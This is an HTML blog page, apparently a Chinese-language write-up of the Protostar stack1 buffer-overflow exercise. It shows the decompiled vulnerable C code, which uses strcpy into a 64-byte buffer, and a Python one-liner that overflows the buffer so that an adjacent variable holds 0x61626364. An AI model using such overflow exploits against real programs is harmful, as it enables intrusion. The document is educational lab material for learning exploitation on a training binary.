@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Protostar_stack1 - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Protostar_stack1</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1687748944676"
+                  >2023</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1699342022730"
+                  >2023</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>运行程序，如下</p>
+<p><img src="/_resources/f85f202179ae44f69346935c496b976c.png" /></p>
+<p><strong>checksec</strong></p>
+<p><strong><img src="/_resources/b4c88f613ad64522ad48fe23cd941c77.png" alt="d3ae0530430fd8b497a72ade0e9fa2a2.png" width="430" height="218" class="jop-noMdConv" /></strong></p>
+<p>查看反编译代码</p>
+<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span>
+</span>{
+    undefined auStack84 [<span class="hljs-number">64</span>];
+    <span class="hljs-type">int32_t</span> iStack20;
+    
+    <span class="hljs-keyword">if</span> (argv == (<span class="hljs-type">char</span> **)<span class="hljs-number">0x1</span>) {
+        <span class="hljs-built_in">errx</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"please specify an argument\n"</span>);
+    }
+    iStack20 = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">strcpy</span>(auStack84, envp[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">if</span> (iStack20 == <span class="hljs-number">0x61626364</span>) {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"you have correctly got the variable to the right value"</span>);
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Try again, you got 0x%08x\n"</span>, iStack20);
+    }
+    <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<p>本题目相较于stack0,增加一个检测<code>(iStack20 == 0x61626364)</code></p>
+<p><strong>exp如下：</strong></p>
+<p><strong>(0x61626364即abcd,要以小端序格式输入，adba --&gt; \x64\x63\x62\x61)</strong></p>
+<p><code>./stack1 `python -c "print('A'*64+'\x64\x63\x62\x61')"`</code></p>
+<img src="/_resources/b6b929337ca84100af479f73a1acd162.png" alt="c5a4931b42cb39cab0893683b1ca473b.png" width="473" height="40" class="jop-noMdConv" />
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
